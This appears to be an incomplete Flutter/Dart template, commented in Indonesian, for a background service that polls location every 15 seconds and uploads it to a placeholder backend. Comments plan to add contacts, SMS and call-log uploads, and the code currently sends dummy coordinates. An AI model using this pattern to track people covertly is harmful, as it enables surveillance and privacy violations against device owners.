import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_background_service_android/flutter_background_service_android.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
// Tambahkan plugin lain sesuai kebutuhan device data (geolocator, contacts_service, sms_maintained, call_log, dsb)

Future<void> initializeService(String userId) async {
  final service = FlutterBackgroundService();

  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: serviceEntryPoint,
      autoStart: true,
      isForegroundMode: true,
      notificationTitle: 'Aplikasi berjalan di background',
      notificationText: 'Mengirim data secara otomatis',
    ),
    iosConfiguration: IosConfiguration(
      autoStart: true,
      onForeground: serviceEntryPoint,
      onBackground: null,
    ),
  );
  service.startService();
  // Save userId to shared prefs or secure storage if diperlukan
}

// Entry point background
@pragma('vm:entry-point')
void serviceEntryPoint(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();
  final userId = "user123"; // TODO: Ambil userId secara dinamis

  if (service is AndroidServiceInstance) {
    service.on('setAsForeground').listen((event) {
      service.setAsForegroundService();
    });
    service.on('setAsBackground').listen((event) {
      service.setAsBackgroundService();
    });
  }

  // Loop interval
  Timer.periodic(const Duration(seconds: 15), (timer) async {
    // Permission check
    if (!await Permission.locationAlways.isGranted ||
        !await Permission.contacts.isGranted ||
        !await Permission.sms.isGranted ||
        !await Permission.phone.isGranted) {
      // Optionally: show notification/stop service
      return;
    }

    // === AMBIL DATA ===
    Map<String, dynamic> payload = {};

    // Contoh: Ambil lokasi (pakai geolocator)
    // final position = await Geolocator.getCurrentPosition();
    // payload['type'] = 'gps';
    // payload['lat'] = position.latitude;
    // payload['lon'] = position.longitude;
    // payload['time'] = DateTime.now().toIso8601String();

    // Contoh dummy data:
    payload = {
      "type": "gps",
      "lat": -6.210 + (0.001 * (timer.tick % 5)),
      "lon": 106.820 + (0.001 * (timer.tick % 5)),
      "time": DateTime.now().toIso8601String(),
      "address": "Jl. Sudirman, Jakarta"
    };

    // === KIRIM KE BACKEND ===
    try {
      final res = await http.post(
        Uri.parse("http://your-backend.com:8000/device_data/$userId"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode(payload),
      );
      if (res.statusCode == 200) {
        service.invoke('update', {"status": "sent", "time": payload['time']});
      }
    } catch (e) {
      service.invoke('update', {"status": "error", "msg": e.toString()});
    }

    // Tambahkan kirim data kontak, sms, call, dsb di interval berbeda jika perlu
  });
}